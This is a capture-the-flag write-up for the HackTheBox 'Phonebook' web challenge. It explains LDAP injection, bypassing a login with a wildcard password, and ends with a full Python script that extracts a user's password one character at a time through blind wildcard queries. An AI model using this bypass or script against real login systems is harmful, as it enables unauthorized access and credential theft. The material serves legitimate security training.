# HackTheBox Phonebook
## Reconnaissance
After booting up the challenge, we are greeted with the following login screen:
![Login screen](/web/HTB_Phonebook/images/login.PNG)
This screen reveals some interesting information. First of all, the website allows for logging in with workstation usernames and passwords. It is thus most likely connected to Active Directory in some way. Second, there is most likely a user named Reese.

My first idea here was to use dirbuster to see if there were any files exposed that would reveal workstation credentials. However, my dirbuster scan did not result in any interesting files. Instead, I went researching what technology could be behind the AD login to see what it is that we are attacking. My search resulted in the following two forum posts:

[Using active directory to authenticate users on intranet site](https://stackoverflow.com/questions/17773643/using-active-directory-to-authenticate-users-on-intranet-site)

[What is it called when you can log into multiple workstations with one username and password](https://askubuntu.com/questions/727504/what-is-it-called-when-you-can-log-into-multiple-workstations-with-one-username)

These posts revealed that we are most likely looking at an LDAP login. Searching for LDAP vulnerabilities result in tons of pages about LDAP injection including an [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection) page. At this point I spent some time reading up on LDAP injection, and found a nice [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md) resource. This page describes in detail how LDAP injection works, so if it is a new topic for you as well I highly suggest reading up on this. 

## LDAP injection
To summarize, LDAP injection works somewhat similar to SQL injection. The username and password are put into a query that is evaluated. Interestingly, the queries can allow wildcards with `*`. As we don't have the code running and thus don't (yet) know what the query looks like, lets try using a wildcard `*`.

Remember that at the start of the challenge we identified the user Reese. We can try to login using the username `Reese`, and as password we can use `*`. This works! We land on a page that seems to be the actual phonebook. We can search through the phonebook on this page, which results in some names with email addresses and phone numbers. However, there is nothing that immediately looks like it would contain a flag.

![Phonebook](/web/HTB_Phonebook/images/phonebook.PNG)

Here I got stuck for a bit, as it was not clear what we should attack next to get the flag for the challenge. I read through the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md) page again, and realised we might want to try blind exploitation. This allows us to brute force the password one by one, whereas previously we just bypassed the password altogether. This allows us to figure out the password, which will hopefully be the flag for the challenge. We can test if Reese's password contains the flag by logging in with the username `Reese`, and password `HTB*`. This will be successful if the password starts with `HTB`, indicating it is a flag. Luckily, this works!

Bruteforcing the password by hand will take quite a lot of work, especially considering flags often contain both uppercase and lowercase letters, as well as numbers and some other characters. Let's thus create a script for this. This script should brute force character by character, and add the character to the password if the login succeeds. Testing the login by hand reveals that both successful and unsuccessful logins result in a redirect (HTTP status code 302), but a successful login redirects to `/` and an unsuccessful one redirects to `/login?message=Authentication%20failed`. 

Below is the Python script I created to extract the flag:

```
import requests
import string

TARGET_URL = "http://<IP>:<PORT>" # Change to actual IP and PORT
LOGIN_PATH = "/login"
USERNAME = "Reese"
PASSWORD = ""

CHARACTER_SET = string.ascii_letters + string.digits + '_-{}!'


def check_password(username, password):
    login_url = f"{TARGET_URL}{LOGIN_PATH}"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(login_url, data=data, allow_redirects=False)
    redirect_location = response.headers.get('Location')
    if redirect_location == "/":
        return True
    else:
        return False



while True:
    for char in CHARACTER_SET:
        current_guess = PASSWORD + char
        print(f"[*] Progress: {current_guess}", end='\r')
        if check_password(USERNAME, current_guess + "*"):
            PASSWORD += char
            break
    if char == "}":
        break
    
print(f"\n[*] Found password: {PASSWORD}")
```
